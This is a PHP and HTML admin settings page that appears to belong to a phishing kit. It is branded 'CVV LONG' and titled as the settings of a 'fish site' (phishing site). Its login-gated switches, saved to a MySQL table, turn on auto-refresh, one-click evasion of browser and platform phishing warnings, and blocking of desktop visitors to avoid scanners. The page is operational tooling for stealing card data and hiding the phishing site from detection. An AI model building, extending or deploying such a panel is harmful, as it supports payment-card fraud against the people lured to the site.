<?php
date_default_timezone_set('Asia/Tokyo');
$time=date('Hi');

//echo $time;
$theme_mode='day';
if (($time >= "0600") && ($time <= "1200")) {
  $admin_time_zone_msg = "Good Morning";
  $theme_mode='day';
}

elseif (($time >= "1201") && ($time <= "1600")) {
  $admin_time_zone_msg = "Good Afternoon";
  $theme_mode='day';
}

elseif (($time >= "1601") && ($time <= "2100")) {
  $admin_time_zone_msg = "Good Evening";
  $theme_mode='day';
}

elseif (($time >= "2101") && ($time <= "2400")) {
  $admin_time_zone_msg = "Good Night";
  $theme_mode='night';
}
else{
  $admin_time_zone_msg = "Why aren't you asleep?  Are you programming?<br>";
}

require_once 'config.php';

if (isset($_POST['form_submission'])) {

    $auto_refresh = @$_POST['auto_refresh'];
    if (!empty($auto_refresh)) {
        $auto_refresh = 'on';
    } else {
        $auto_refresh = "off";
    }

    $proxy_access = @$_POST['proxy_access'];
    if (!empty($proxy_access)) {
        $proxy_access = 'on';
    } else {
        $proxy_access = "off";
    }

    $pc_access = @$_POST['pc_access'];
    if (!empty($pc_access)) {
        $pc_access = 'on';
    } else {
        $pc_access = "off";
    }

    $sql = "UPDATE `dashboard` SET value='" . $auto_refresh . "'  WHERE meta_key='auto_refresh'";
    $result = mysqli_query($conn, $sql);

    $sql = "UPDATE `dashboard` SET value='" . $proxy_access . "'  WHERE meta_key='proxy_access'";
    $result = mysqli_query($conn, $sql);

    $sql = "UPDATE `dashboard` SET value='" . $pc_access . "'  WHERE meta_key='pc_access'";
    $result = mysqli_query($conn, $sql);
}

$row=[];
$sql = "SELECT * FROM dashboard where meta_key='auto_refresh'";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $get_auto_refresh = $row[3];

    }
$row=[];
$sql = "SELECT * FROM dashboard where meta_key='proxy_access'";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $get_proxy_access = $row[3];

    }
$row=[];
$sql = "SELECT * FROM dashboard where meta_key='pc_access'";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $get_pc_access = $row[3];

    }

// Initialize the session
session_start();

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"])){
    header("location: /admin/login.php");
    exit;
}
?>

<!DOCTYPE html>

<html
  lang="en"
  class="light-style layout-menu-fixed"
  dir="ltr"
  data-theme="theme-default"
  data-assets-path="./assets/"
  data-template="vertical-menu-template-free"
>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"
    />

    <title>设置</title>

    <meta name="description" content="" />

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="./assets/img/favicon/favicon.ico" />

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap"
      rel="stylesheet"
    />

    <!-- Icons. Uncomment required icon fonts -->
    <link rel="stylesheet" href="./assets/vendor/fonts/boxicons.css" />

    <!-- Core CSS -->
    <link rel="stylesheet" href="./assets/vendor/css/core.css" class="template-customizer-core-css" />
    <link rel="stylesheet" href="./assets/vendor/css/theme-default.css" class="template-customizer-theme-css" />
    <link rel="stylesheet" href="./assets/css/demo.css" />

    <!-- Vendors CSS -->
    <link rel="stylesheet" href="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.css" />

    <!-- Page CSS -->
    <?php if($theme_mode =='night') {?>
    <link rel="stylesheet" href="./assets/css/core-dark.css" />
    <link rel="stylesheet" href="./assets/css/theme-default-dark.css" />
    <?php }?>

    <!-- Helpers -->
    <script src="./assets/vendor/js/helpers.js"></script>

    <!--! Template customizer & Theme config files MUST be included after core stylesheets and helpers.js in the <head> section -->
    <!--? Config:  Mandatory theme config file contain global vars & default theme options, Set your preferred theme option in this file.  -->
    <script src="./assets/js/config.js"></script>
  </head>

  <body>
    <!-- Layout wrapper -->
    <div class="layout-wrapper layout-content-navbar">
      <div class="layout-container">
        <!-- Menu -->

        <aside id="layout-menu" class="layout-menu menu-vertical menu bg-menu-theme">
          <div class="app-brand demo">
            <a href="index.html" class="app-brand-link">
              <span class="app-brand-logo demo">

              </span>
              <span class="app-brand-text demo menu-text fw-bolder ms-2">CVV LONG</span>
            </a>

            <a href="javascript:void(0);" class="layout-menu-toggle menu-link text-large ms-auto d-block d-xl-none">
              <i class="bx bx-chevron-left bx-sm align-middle"></i>
            </a>
          </div>

          <div class="menu-inner-shadow"></div>

          <ul class="menu-inner py-1">
            <!-- Dashboard -->
            <li class="menu-item">
              <a href="index.php" class="menu-link">
                <i class="menu-icon tf-icons bx bx-home-circle"></i>
                <div data-i18n="Analytics">仪表盘</div> <!-- dashboard -->
              </a>
            </li>
			<li class="menu-item">
              <a href="users.php" class="menu-link">
                <i class="menu-icon tf-icons bx bx-table"></i>
                <div data-i18n="Analytics">操作台</div> <!-- user -->
              </a>
            </li>
            <li class="menu-item active">
              <a href="users.php" class="menu-link">
                <i class="menu-icon tf-icons bx bx-cog"></i>
                <div data-i18n="Analytics">设置</div> <!-- settings -->
              </a>
            </li>
              <li class="menu-item">
                  <a href="/admin/logout.php" class="menu-link">
                      <i class="menu-icon tf-icons bx bx-log-out"></i>
                      <div data-i18n="Analytics">登出</div> <!-- Logout -->
                  </a>
              </li>

          </ul>
        </aside>
        <!-- / Menu -->

        <!-- Layout container -->
        <div class="layout-page">
          <!-- Content wrapper -->
          <div class="content-wrapper">
            <!-- Content -->

            <div class="container-xxl flex-grow-1 container-p-y">
              <!-- Layout Demo -->
              <div class="content-wrapper">
                <h4 class="fw-bold py-3 mb-4"><span class="text-muted fw-light"> </span> 鱼站/设置</h4>

                <div class="col-xl-6">
                  <div class="card mb-4">
                    <h5 class="card-header">设置</h5>
                    <div class="card-body">
                    <form method="POST" action="">

                      <div class="form-check form-switch mb-4">
                        <input class="form-check-input" name="auto_refresh" type="checkbox" id="flexSwitchCheckChecked" <?php echo (@$get_auto_refresh=='on')?'checked':'' ?>>
                        <label class="form-check-label" for="flexSwitchCheckChecked">开启自动刷新</label>
                      </div>
                      <div class="form-check form-switch mb-4">
                        <input class="form-check-input" name="proxy_access" type="checkbox" id="flexSwitchCheckChecked2" <?php echo (@$get_proxy_access=='on')?'checked':'' ?>>
                        <label class="form-check-label" for="flexSwitchCheckChecked2">一键防红</label>
                      </div>
                      <div class="form-check form-switch mb-4">
                        <input class="form-check-input" name="pc_access" type="checkbox" id="flexSwitchCheckChecked3" <?php echo (@$get_pc_access=='on')?'checked':'' ?>>
                        <label class="form-check-label" for="flexSwitchCheckChecked3">禁止pc访问</label>
                      </div>

                    <input name="form_submission" type="hidden" value="submitted">
                    <button type="submit" value="submit" class="btn btn-primary">Save</button>
                    </form>
                    </div>

                  </div>
                </div>

              </div>
              <!--/ Layout Demo -->
            </div>
            <!-- / Content -->

            <!-- Footer -->
            <footer class="content-footer footer bg-footer-theme">
              <div class="container-xxl d-flex flex-wrap justify-content-between py-2 flex-md-row flex-column">
                <div class="mb-2 mb-md-0">
                  ©
                  <script>
                    document.write(new Date().getFullYear());
                  </script>
                  , made with ❤️

                </div>
              </div>
            </footer>
            <!-- / Footer -->

            <div class="content-backdrop fade"></div>
          </div>
          <!-- Content wrapper -->
        </div>
        <!-- / Layout page -->
      </div>

      <!-- Overlay -->
      <div class="layout-overlay layout-menu-toggle"></div>
    </div>
    <!-- / Layout wrapper -->



    <!-- Core JS -->
    <!-- build:js assets/vendor/js/core.js -->
    <script src="./assets/vendor/libs/jquery/jquery.js"></script>
    <script src="./assets/vendor/libs/popper/popper.js"></script>
    <script src="./assets/vendor/js/bootstrap.js"></script>
    <script src="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>

    <script src="./assets/vendor/js/menu.js"></script>
    <!-- endbuild -->

    <!-- Vendors JS -->

    <!-- Main JS -->
    <script src="./assets/js/main.js"></script>

    <!-- Page JS -->

    <!-- Place this tag in your head or just before your close body tag. -->
    <script async defer src="https://buttons.github.io/buttons.js"></script>

<link rel="stylesheet" type="text/css" href="DataTables/datatables.min.css"/>
<script type="text/javascript" src="DataTables/datatables.min.js"></script>

<script>
$(document).ready(function () {
    // Setup - add a text input to each footer cell
   /* $('#example tfoot th').each(function () {
        var title = $(this).text();
        $(this).html('<input type="text" placeholder="Search ' + title + '" />');
    }); */

    // DataTable
    var table = $('#example').DataTable({
        initComplete: function () {
            // Apply the search
            this.api()
                .columns()
                .every(function () {
                    var that = this;

                    $('input', this.footer()).on('keyup change clear', function () {
                        if (that.search() !== this.value) {
                            that.search(this.value).draw();
                        }
                    });
                });
        },
    });
});
</script>


  </body>
</html>
